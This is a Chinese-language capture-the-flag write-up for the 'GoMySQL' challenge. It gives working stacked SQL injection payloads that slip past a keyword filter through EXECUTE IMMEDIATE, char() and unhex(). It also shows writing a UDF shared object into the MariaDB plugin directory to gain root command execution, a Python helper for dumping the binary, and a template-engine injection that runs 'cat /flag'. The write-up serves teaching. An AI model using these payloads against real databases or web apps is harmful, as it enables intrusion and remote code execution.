# GoMySQL

## 题目简述

题目是 Go + MariaDB Web 应用，主要入口有 `/calc` 和 `/draw`。`/calc` 暴露了可执行多语句的 SQL 注入，可用于确认数据库能力和环境信息；最终拿 flag 的关键在 `/draw` 的自写模板引擎：变量替换、引号消去和 safe/unsafe 函数判断顺序不一致，可以把固定模板改写成 `run('cat /flag');unsafe`。

## 解题过程

先黑盒测试 `/calc`。后端会把输入拼进：

```sql
SELECT <expression>
```

并且连接 MariaDB 时允许 multiple statements。虽然过滤了 `SELECT`、`UNION`、`SCHEMA`、`OUTFILE`、`INTO`、`ALTER`、`CREATE`、`PREPARE`、`FLAG`、`@@`、`_`、`=` 等关键字，但 MariaDB 10.11 支持 `EXECUTE IMMEDIATE`，该关键字未被过滤。可以用 `char(...)` 编码任意 SQL：

```sql
1;EXECUTE IMMEDIATE char(115,101,108,101,99,116,32,118,101,114,115,105,111,110,40,41)
```

也可以拆分关键字或用 `unhex()` 绕过子串过滤，例如查询 plugin 目录：

```sql
1;EXECUTE IMMEDIATE concat("sel", "ect ", unhex('40'), unhex('40'), "plugin", unhex('5f'), "dir");
```

这一步能确认后端数据库、用户权限和服务环境，但 `/flag` 不在数据库中，`LOAD_FILE('/flag')` 也无法直接读取。继续检查发现 `secure_file_priv` 为空、`plugin_dir` 可写，于是可以通过 `EXECUTE IMMEDIATE` 写入 MySQL UDF 并注册 `sys_eval`：

```sql
1;EXECUTE IMMEDIATE concat("sel", "ect ", unhex('40'), unhex('40'), "secure", unhex('5f'), "file", unhex('5f'), "priv");
1;EXECUTE IMMEDIATE concat("sel", "ect ", unhex('40'), unhex('40'), "plugin", unhex('5f'), "dir");
1;EXECUTE IMMEDIATE concat("SEL", "ECT 0x<lib_mysqludf_sys_64.so hex> IN", "TO DUMP", "FILE '/usr/lib/mysql/plugin/udf.so'");
1;EXECUTE IMMEDIATE concat("cre", "ate func", "tion sys", unhex('5f'), "eval returns string soname 'udf.so'");
```

有了 `sys_eval` 后可以执行 `ps -ef`，发现 Go 应用本体 `myapp` 以 root 权限运行；再用 SQL 的 `load_file()` 分块读取 `/usr/local/bin/*myapp`，保存到本地后用 IDA/反编译工具审计 `/draw`。桥接逻辑可以写成：

```python
def udf_eval(command):
    return immediate(["sel", "ect sys", US, f"eval('{command}');"])

def discover_binary(target, timeout):
    print(run_udf(target, "ps -ef", timeout))
    listing = run_udf(target, "ls /usr/local/bin/*myapp", timeout)
    return re.search(r"(/[^\s]*myapp)", listing).group(1)

def download_binary(target, runtime_path, output_path, chunk_size, timeout):
    size_expr = load_file_query(["length(load", f"file({quoted_path}));"])
    ...
```

因此 `/calc` 的作用不只是摸清数据库，而是把 SQL 注入扩展为 UDF 命令执行，再拿到 root Go 进程的二进制用于恢复 `/draw` 模板引擎。

`/draw` 的固定模板类似：

```html
<h1>Hello, <b><\ %name% /></b></h1>
<p class="number">Your number today: <b><\ draw_number(%name%); /></b></p>
```

模板引擎的关键正则为：

```go
templateCommandRE = regexp.MustCompile(`(?is)<\\.*?/>`)
templateVarRE     = regexp.MustCompile(`(?is)%(.*)%`)
templateFuncRE    = regexp.MustCompile(`(?is)^<\\\s*?(([a-z0-9_]+)\('([^']*?)'\);\s*?(unsafe)?\s*?)\s*?/>$`)
quotedCommandRE   = regexp.MustCompile(`(?is)^<\\(\s*?('[^']*?')*?\s*?)*?/>$`)
```

处理顺序是：

```text
1. 找第一个 <\ ... /> 命令。
2. 如果命令中存在 %...%，先做变量替换，并给变量值加单引号。
3. 否则如果匹配 func('arg');，执行函数。
4. 否则如果只由若干单引号字符串组成，删除 <\、/> 和所有单引号，把字符串片段拼起来。
```

函数表中 `run` 是 unsafe 函数，会直接执行 shell 命令：

```go
var templateFuncs = map[string]templateFunc{
    "draw_number": {safe: true, call: func(name string) (string, error) {
        return fmt.Sprintf("%d", crc32.ChecksumIEEE([]byte(name))), nil
    }},
    "strrot": {safe: true, call: func(value string) (string, error) {
        return strrot(value), nil
    }},
    "run": {safe: false, call: func(command string) (string, error) {
        return runCommand(command)
    }},
}
```

关键问题是固定模板里没有直接可控的 `unsafe`。利用点有三个：

- `<\` 和 `/>` 这类模板标识可以通过变量替换重新引入。
- quoted command 分支会删除所有配对单引号，把多个字符串片段拼起来。
- `templateVarRE` 的 `%...%` 是贪婪匹配，可以把两个模板命令之间的大段内容合并成一个可控变量名。

第一段变量构造用于生成新的未闭合模板命令头：

```python
name = "<<%n1%"
n1   = "%n2%"
n2   = r"\\%n3%"
n3   = "%n4%"
n4   = "strrot(%"
```

模板第一处 `<\ %name% />` 会逐轮变成：

```text
<\ %name% />
=> <\ '<<%n1%' />
=> <\ '<<'%n2%'' />
=> <\ '<<''\\%n3%''' />
=> <\ '<<''\\'%n4%'''' />
=> <\ '<<''\\''strrot(%''''' />
```

这时既没有完整变量，也不是函数调用，会进入 quoted command 分支，删除模板标识和引号后得到：

```text
<\strrot(%
```

因为它还没有 `/>`，下一轮 `templateCommandRE` 会一直吃到第二个模板命令的结尾：

```text
<\strrot(% </b></h1>
<p class="number">Your number today: <b><\ draw_number(%name%); />
```

中间大段内容被 `%...%` 贪婪匹配成变量名。把这个长变量的值设置为 ROT47 后的 payload：

```text
ROT47("/><\run('cat /flag');unsafe/>")
```

`strrot()` 是 safe 函数，可以执行。它返回：

```text
/><\run('cat /flag');unsafe/>
```

返回值被模板引擎加上单引号后，下一轮会先消掉前面的无用命令，剩下真正的 unsafe 调用：

```text
<\run('cat /flag');unsafe/>
```

因此 `/draw` 最终会以 root 运行的 Go 服务身份执行 `cat /flag`。得到：

```text
ACTF{y0u1_sqI_Y0ur_Go!!!!!_dxqmcFIr4ZCpo5OeNqSL}
```

最终脚本进入目标环境，完成 UDF/RCE 阶段并读取 flag，验证了 Go/MySQL 链条可用。

## 方法总结

- 核心技巧：利用自写模板引擎中变量替换、quoted command 消引号、函数 safe/unsafe 判断的顺序差异，重新拼出 unsafe 函数调用。
- 识别信号：固定模板看似不可控时，要检查替换后的内容是否会再次进入模板解析；贪婪变量正则和递归渲染尤其危险。
- 复用要点：SQL 注入可用于摸清环境，但最终链条要回到 root 运行的业务逻辑；WP 中需要讲清每一轮模板如何变化，否则 payload 难以复现。
